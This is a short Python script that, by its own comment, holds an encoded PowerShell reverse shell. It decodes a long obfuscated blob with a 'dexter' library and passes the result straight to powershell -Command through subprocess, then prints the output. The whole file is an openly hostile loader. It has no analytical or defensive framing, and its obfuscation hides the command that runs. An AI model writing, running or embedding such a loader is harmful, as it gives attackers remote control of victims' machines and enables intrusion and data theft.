import dexter as d
import subprocess

# Encoded PowerShell reverse shell command
encoded_data = """
2191198831a821862c9e178a2b931d821985208c1232325f0f7d12811b8b1838214e30871b3b248c329b25891c80288d0c7a2d4d1c492c9a0d7c0b792c951d3d214e127725951f3f2d8f27a011810c6d2a9d198c1c3c113e117420402e501438277b26692777276a208c0e770e73198721951030316e25452775288d158c174418671577238d278c1a7d30a42a4a317f2c91269a2c5a227531a02c8f117c248925991d90194730842164207014570c782891329718862fa331591a41306125572c63315f2555315f29591f4d1c4d305729552a4a1146215114491646244d124d10342c7a258a1d912ca31c8b27990f7a0a5d30a4138511762788329f1e3e24611131274b176b185b297932752894329b10751b891589103e2269278c289c2376118513851c81137414811a420c35104b1e422a7d0d811789208515761b882f861385218a108423880b7d1d3d114e25451c6a0a6f1a911643227126881781319624871e9229490b542f7e1f4d26790e82198b0c7128891e8b2d840d7f1c850d81197e0d7f133b183c1e6c2489289c31a81a8912840b7612650f832496187d1d7e309d224b2d68147a299e29972e911589157e19882e9c1b3b0b62259717802a9e2e9315690b7a2275198d1a8c137827880b782545123a31552477168a0e8027901886177e264f24441792227d288a1e9732a622872f8a0b681c791f43198c1f822294167f0e7e22961a542163168b0b713096187d30a20e2e306d22421242204e235131550e6216591d6d2e710d7920892c911a8830a40f3d106211760c6f0d722b941f950b7030721d92187e177d23880d7f3083228b229c20852343229e11310f3410300f8a32621a970e4911353083299d1e90197e24851c893087289a0e77289c1d82198b2957247b24962f9814880c7118401d412d8010842294258e2391248b1f3f285324441138116418602b70206c146028661e3e0f36315a134e2c500a5d138722941e83117227941c7330a21e871387197e23950b39286e1a86249930a3167e2048163f2daa0b6210822992198d0b700e621f8e22750b7f2a9c0d722889309d1c3c2d541138104b11880b730c75309c2d92163e2a5215390c4e229b2fa31c8131a4196b10752a8b31950a2a23603050274b1e6c1c8125990c831786289a17822174279b20920c710e6f25921a480a5c2d9217782286123a264a0f511388268c248a268b1f912f5b0a2a0c3c305c20402e521c5e1f941076117731961587295725711f841a881c830c8031992b540b3432520b382c93249830502959224b18382faa1034226518871683279425862e9c2c902e4e104d27470b33288313870c712199289c2f5d11762d9b20832f9e0e72329b1b892e952986104a1b55287d2e822a70326a1c4529571a612a8f1c9020732b9f2fa1127b0d7b167d274f183c16580a7f0d730d731b801e9026520f2f22521f4b0f2f2b4f1a5c1d961387167b0b7e13650f74228313772848184512322d5e1f481e592a4e105f198e229625951e931a8e30500a471636259931a3219a2545209b17602a981c9231a0208b1479235020652ea6259520921c810f82239629922f9e27950c2c2044286b1e8d0c79178420810a78288c234331630f4d1a4010411a3a2aa61a3a0f5e239810841e4b3184178b24962e97319f0d7413902747187b2788188c278a0f7732520f8a284c278620400f8b1b3b32811f942fa31b482e811488198b30991583187f29a6298013852b94168a278c1e7215840f62108415872d921d7e17841434133b2b4f318032a70a7e0e7e198e1d9130592eab1438287b188c188a23882283127f0e6524962a93108422871b8d17452f720f7b0a7923962489123a224b2b4d
"""

# Decode the encoded data using the Dexter decoder
decoded_command = d.decode(encoded_data)

# Execute the decoded command
def execute_powershell(command):
    try:
        # Using subprocess to execute the PowerShell command dynamically
        process = subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Capture output and errors
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            print("PowerShell Command Output:")
            print(stdout.decode())  # Decoding and printing stdout
        else:
            print("Error executing PowerShell command:")
            print(stderr.decode())  # Decoding and printing stderr
    except Exception as e:
        print(f"An error occurred: {e}")

# Execute the decoded PowerShell command
execute_powershell(decoded_command)
